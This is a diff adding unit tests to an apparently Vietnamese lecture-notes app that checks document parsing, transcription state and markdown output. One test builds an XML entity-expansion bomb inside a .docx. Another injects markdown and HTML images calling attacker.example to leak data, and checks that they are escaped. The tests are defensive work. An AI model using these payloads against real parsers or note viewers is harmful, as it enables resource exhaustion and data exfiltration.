@@ -94,6 +94,23 @@ class DocumentTests(unittest.TestCase):
         broken.write_bytes(b'not a zip')
         self.assertEqual(documents.parts_for(broken, 'claude')[0], [])
 
+    def test_hostile_office_files_stay_small_and_become_warnings(self):
+        bomb = office(self.root / 'bomb.docx', {'word/document.xml': '<!DOCTYPE d [<!ENTITY a "' + 'x' * 60 + '">]>'
+                                                f'<w:document {W}><w:body><w:p><w:r><w:t>' + '&a;' * 1000 + '</w:t></w:r></w:p></w:body></w:document>'})
+        parts, warning = documents.parts_for(bomb, 'claude')
+        self.assertEqual(parts, [])
+        self.assertIn('không đọc được', warning)
+        with patch.object(documents, 'TEXT_LIMIT', 50):
+            long = office(self.root / 'long.docx', {'word/document.xml': f'<w:document {W}><w:body>' + ('<w:p><w:r><w:t>' + 'y' * 30 + '</w:t></w:r></w:p>') * 10 + '</w:body></w:document>'})
+            self.assertEqual(documents.text_of(long), 'y' * 30 + '\n' + 'y' * 20)
+        slide = f'<p:sld xmlns:p="x" {A}><a:p><a:r><a:t>' + 'z' * 100 + '</a:t></a:r></a:p></p:sld>'
+        with patch.object(documents, 'OFFICE_LIMIT', 1000):
+            many = office(self.root / 'many.pptx', {'ppt/slides/slide' + str(n) + '.xml': slide for n in range(1, 30)})
+            self.assertEqual(documents.parts_for(many, 'ollama')[0], [])
+        # Files that are broken in other ways (missing part, unsupported compression) are warnings too.
+        empty = office(self.root / 'empty.docx', {'other.xml': '<x/>'})
+        self.assertIn('không đọc được', documents.parts_for(empty, 'claude')[1])
+
     def test_pdf_goes_whole_to_claude_and_as_text_to_ollama(self):
         from pypdf import PdfWriter
         pdf = self.root / 'scan.pdf'
@@ -202,6 +219,64 @@ class StudyPipelineTests(unittest.TestCase):
         self.assertIn('Hết hạn mức', engine.status()['errors']['Kinh tế vi mô'])
         engine.request('subject', 'Kinh tế vi mô')
         self.assertEqual(len(engine.jobs), 1)
+
+    def test_unexpected_errors_are_remembered_instead_of_retried_every_scan(self):
+        self.lesson()
+        failing = []
+        def broken(*args, **kwargs):
+            failing.append(1)
+            raise MemoryError()
+        engine = study.Engine()
+        with patch.object(study.ai, 'generate', broken):
+            for _ in range(3):
+                engine.scan()
+                engine.run_jobs()
+        self.assertEqual(len(failing), 1)
+        self.assertIn('MemoryError', engine.status()['errors']['Kinh tế vi mô'])
+
+    def test_no_notes_are_made_while_the_lesson_is_still_recording(self):
+        folder = self.lesson(transcript='')
+        (folder / '01_Tai_lieu_goc/slide_0001.jpg').write_bytes(b'jpg')
+        engine = study.Engine()
+        with patch.object(study.runner, 'state', lambda: {'running': True, 'path': str(folder)}):
+            engine.scan()
+            self.assertEqual(list(engine.jobs), [])
+        engine.scan()
+        self.assertEqual(list(engine.jobs), [('session', folder, ())])
+
+    def test_model_text_cannot_plant_images_or_html_in_markdown(self):
+        folder = self.lesson()
+        notes = study.analyze_session(folder.parent, folder)
+        notes['tom_tat'] = '![x](https://attacker.example/p?d=bai) <img src="https://attacker.example/i"> [nguồn](https://example.org)'
+        markdown = study.session_markdown('Môn', notes)
+        self.assertNotIn('![', markdown)
+        # Escaped, so viewers show the text instead of loading it; ordinary links stay clickable.
+        self.assertIn('\\<img', markdown)
+        self.assertNotIn(' <img', markdown)
+        self.assertIn('[nguồn](https://example.org)', markdown)
+
+    def test_a_finished_transcription_of_silence_is_not_repeated(self):
+        folder = self.lesson(transcript='')
+        (folder / '01_Tai_lieu_goc/am_thanh.wav').write_bytes(b'RIFF')
+        (folder / '02_Tom_tat/ban_chep_loi.txt').write_text('', encoding='utf-8')
+        self.assertEqual(study.transcription_state(folder), 'needed')
+        (folder / '02_Tom_tat/trang_thai.json').write_text(json.dumps({'state': 'completed', 'segments': 0}), encoding='utf-8')
+        self.assertEqual(study.transcription_state(folder), 'done')
+        later = time.time() + 5
+        os.utime(folder / '01_Tai_lieu_goc/am_thanh.wav', (later, later))
+        self.assertEqual(study.transcription_state(folder), 'needed')
+
+    def test_a_killed_transcriber_is_recorded_as_failed(self):
+        folder = self.lesson(transcript='')
+        (folder / '01_Tai_lieu_goc/am_thanh.wav').write_bytes(b'RIFF')
+        status = folder / '02_Tom_tat/trang_thai.json'
+        status.write_text(json.dumps({'state': 'processing', 'time': '2026-10-01T08:00:00'}), encoding='utf-8')
+        class Killed:
+            def wait(self):
+                return -9
+        study.runner.watch_transcription(Killed(), status)
+        self.assertEqual(json.loads(status.read_text(encoding='utf-8'))['state'], 'failed')
+        self.assertEqual(study.transcription_state(folder), 'failed')
 
     def test_exam_stems_that_only_name_a_topic_become_questions(self):
         options = ['a', 'b', 'c', 'd']
